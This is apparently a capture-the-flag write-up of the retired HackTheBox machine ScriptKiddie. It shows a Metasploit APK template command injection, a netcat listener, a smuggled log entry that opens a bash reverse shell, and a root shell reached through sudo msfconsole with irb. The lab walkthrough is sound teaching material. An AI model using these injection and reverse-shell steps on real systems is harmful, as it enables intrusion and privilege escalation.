---
layout: post
title: "The Hacker Who Got Hacked"
subtitle: "HTB ScriptKiddie, where the attacker's own tools turn on him, a poisoned APK, a log that runs commands, and a root shell hiding inside msfconsole"
date: 2021-06-12 12:00:00 +0000
description: "A wannabe hacker built a web panel to run his tools for him, and every one of those tools became the door we walked through."
image: /assets/og/the-hacker-who-got-hacked.png
tags: [hackthebox, writeup]
---

ScriptKiddie is a box about a kid who wanted to be a hacker so badly that he built himself a control panel for it. A little web app that runs nmap for him, generates payloads for him, searches exploits for him, so he never has to learn the commands underneath. The joke writes itself, because every one of those convenience features is a place where his tools take a stranger's input and run it. We hand the payload generator a poisoned Android template and the box runs our command instead of building his. We poke a log file that his housemate's script reads back as orders. And at the very top, we find a root shell hiding in plain sight inside the one program a script kiddie trusts most. The whole box is a kid who automated his own tools and never noticed that automation cuts both ways.

```
        S C R I P T K I D D I E
        =======================
        a panel to run the tools so he doesn't have to.

        [ generate payload ]  ← feed it a rigged APK
                 |              the builder runs YOUR command
                 v
        kid       writes a "hackers" log
        [ that log ]  ← another script reads it back as commands
                 |
                 v
        pwn       may run msfconsole as root, no password
                 |
                 v
        the tool he trusts most just hands over the crown.
                                                    弱
```

## 0x01 · the panel

Two ports answer, and the second one is the whole story. A quick `nmap -sC -sV` finds SSH and a Python web server sitting up high.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
```

Werkzeug is the development server that ships with Flask, so we are looking at someone's homemade Python app, not a hardened product. Browse to port 5000 and you meet the kid's pride and joy. Three tools wired to a web form. One field takes an IP and runs nmap against it. One searches exploits with searchsploit. And the interesting one, a payload generator, lets you pick an operating system, type an attacker IP for the callback, and upload a template file. Every box on this list is the app taking what you typed and feeding it to a real command-line tool behind the scenes. That is the seam we work the entire time.

## 0x02 · the poisoned template

The payload generator is meant to wrap msfvenom, the Metasploit tool that bakes a reverse shell into a file. Pick Android and you can upload a template APK, an existing app that msfvenom grafts the payload into so the result still looks legitimate. That template-handling code carries CVE-2020-7384, and it is a beauty.

Here is the flaw in plain terms. To merge a payload into an Android app, msfvenom has to re-sign it, and signing reads the certificate baked into the template. The signing step pasted a field from that certificate straight into a shell command. Think of it like a print shop that re-staples your booklet and, to label the job, reads the title off your cover sheet out loud to a robot that does whatever it hears. Put a normal title on the cover and nothing happens. Put `staple this; also unlock the front door` on the cover and the robot staples the booklet and unlocks the door, because it was never told the title was just a title. The certificate's name field was supposed to be a label. It became a command.

Building the rigged APK is a one-liner in Metasploit. The module forges a template whose certificate name carries our payload.

```
msf6 > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
msf6 > set LHOST 10.10.14.4
msf6 > set LPORT 443
msf6 > run
[+] msf.apk stored at /root/.msf4/local/msf.apk
```

Rename it something innocent, upload it through the payload form with Android selected, and the kid's own generator runs msfvenom against our poison. The signing step reads our certificate, the shell runs the part we hid in it, and a connection lands on our listener.

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.226]
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
cat /home/kid/user.txt
████████████████████████████████
```

We are `kid`, the account the web app runs as. The hacker's tool just hacked the hacker.

## 0x03 · the log that takes orders

Look around as `kid` and the app's source explains the next move. The searchsploit field is guarded by a regex, `^[A-Za-z0-9 \.]+$`, so it only accepts tame characters. But watch what happens when you fail that check. Instead of running searchsploit, the app appends a line to a log, recording the moment and the source IP of whoever poked it.

```python
if regex_alphanum.match(text):
    result = subprocess.check_output(['searchsploit', '--color', text])
else:
    with open('/home/kid/logs/hackers', 'a') as f:
        f.write(f'[{datetime.datetime.now()}] {srcip}\n')
```

A log file is just text, harmless on its own. But across the box another user, `pwn`, owns a script that reads that exact log and acts on it. It is wired to fire automatically whenever the file changes, watched by incron, the file-event cousin of cron.

```bash
log=/home/kid/logs/hackers
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done
```

Read that `sh -c` line slowly, because it is the entire vulnerability. The script grabs everything after the second space on each log line, calls it an IP, and pastes it raw into an nmap command inside a shell. It never checks that the "IP" is actually an IP. Picture a dispatcher reading addresses off a clipboard and radioing each one to a driver, except the dispatcher reads the words out loud and the radio runs whatever it hears. Write a real address and a car gets sent. Write `123 Main St; torch the warehouse` and the warehouse burns, because the clipboard was trusted to hold addresses and nobody enforced it.

So we control the `srcip` that lands in that log, because the app writes the source value rather than enforcing the true connection. Shape it like a command instead of an IP.

```
x x x; bash -c '[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]' #
```

The `cut` keeps everything from the third field on, the semicolon ends the fake nmap target, our payload runs, and the trailing `#` comments out the wreckage. The instant that line hits `/home/kid/logs/hackers`, incron notices the file changed, `pwn`'s script reads our line, and the shell runs it as `pwn`.

```
$ nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.226]
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
```

## 0x04 · the tool that hands over the crown

Now check what `pwn` is allowed to do with `sudo -l`, and the box stops pretending to be subtle.

```
User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

`pwn` can run msfconsole as root, with no password. And msfconsole is not a locked appliance, it is a full interactive console that can drop you to a shell whenever you ask. There is no exploit to write here. The privilege was handed over the moment someone decided the script kiddie's favorite toy should run as root for convenience.

```
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
msf6 > irb
>> system("/bin/bash")
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

A program that runs as root and lets you spawn a shell from inside it is a program that gives away its own crown. msfconsole has an `irb` command that drops into a Ruby prompt, and Ruby's `system` runs any program you name, which here means a root shell. Think of it like a vault that runs as the bank manager but also has a side door anyone inside can walk through. The vault was never the problem. Letting an untrusted hand into a room with that side door was.

## 0x05 · the honest caveat

It is easy to read ScriptKiddie as a joke at the expense of a kid who copied tools he did not understand, and the box does lean on that. But the actual lesson is not about him being a beginner. It is that he committed the same sin at all three layers, and so does almost every real application. Every step was a place where text that should have stayed text got to reach in and pull a lever. The certificate name in the APK was supposed to be a label and became a shell command. The source IP in the log was supposed to be an address and became a shell command. The two are the identical bug, command injection, wearing different costumes one floor apart. The third step is not even a bug, it is a sudo rule a tired admin would write to save themselves a password prompt, and it gives the whole box away.

That is the part worth carrying out of the lab. You can build the fanciest automation in the world, but the moment any piece of it passes a stranger's input into a shell without drawing a hard line around it, you have rebuilt this box. The kid's mistake was not that he leaned on tools. It was that he let his tools trust their input. The line between data and instructions is the entire job, and it does not care whether you are a script kiddie or the program he was trying to grow up into.

## 0x06 · outro

```
he built a panel so the tools would run themselves.
he never noticed the tools would run anyone.

a label became a command. an address became a command.
the toy he trusted most ran as root and let us in.

draw the line. distrust the input. wear black.

                                                            EOF
```

---

*HTB: ScriptKiddie, retired 5 June 2021. An easy Linux box that is really three command injections stacked in a trench coat, ending in a root shell that was always sitting inside msfconsole. The hacker's tools were the door the whole time.*